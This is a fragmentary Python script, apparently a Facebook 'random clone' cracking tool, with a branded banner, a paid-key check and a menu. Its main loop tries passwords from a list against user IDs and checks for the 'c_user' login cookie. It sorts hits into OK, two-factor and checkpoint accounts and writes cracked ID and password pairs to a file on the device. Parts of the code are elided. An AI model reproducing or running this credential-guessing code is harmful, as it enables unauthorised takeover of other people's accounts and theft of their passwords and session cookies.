#created by AHSAN KORAI😈
#team name KORAI-404😈
#tottaly written by HASSAN KHAN
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
...
\033[1;37m╔════════════════════════════════════════════╗
\033[1;31m│\033[1;32m☞  \033[1;32m 𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m  AHSANKORAI        \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m Âhmâd Kïñg       \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m KORAI-404    \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m USE          \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m1.6                    \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m  USE          \033[1;31m│
\033[1;37m╚🅑︎🅗︎🅣︎PRAY FOR ME ANYTIME [MR AHSAN]\033[1;37m🅑︎🅗︎🅣︎╝
\033[1;91m==========================================================
\033[31;44m  I AM  INTELLIGENT BOY \033[0;m
\033[1;91m=========================================================="""
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-", wit)
    print("\t  Facebook : Ahmâd Kïñg")
    print("\t  Fb page  : 😔😔😔")
    print("\t  Github   : KORAI-404")
    print(c, 45*"-")
    print(47*"-")
    try:
        ...
        print("\t Welcome To MR AHSAN- MAFYIA 313 Tool ....")
        time.sleep(2)
    ...
    if f_token in my_server:
        ...
        print(" for  subscription press enter an msg")
        print(" to Ahmad Kïñg fb profile and your key")
        print(" otherwise msg on this whatsapp 03586843174 \n")
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_KORAI-404_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/profile.php?id=safdar.baloch.395");xyz()
    elif hamii in ["4","04"]:
        os.system("xdg-open https://wa.me/+923586843174")
        xyz()    
    elif hamii in ["0","00"]:
       exit()
    else:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[AHSAN-OK] '+uid+' [√] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    print('\r\033[1;34m[AHSAN-2F] '+uid+' [~] '+ps+' ')
                    ...
                    print(f'\r\033[1;30m[AHSAN-CP] '+uid+' [×] '+ps+ ' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[AHSAN-OK] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio AHSAN-OK.mp3")
                print('\r\033[1;32m[AHSAN-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/AHSAN-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
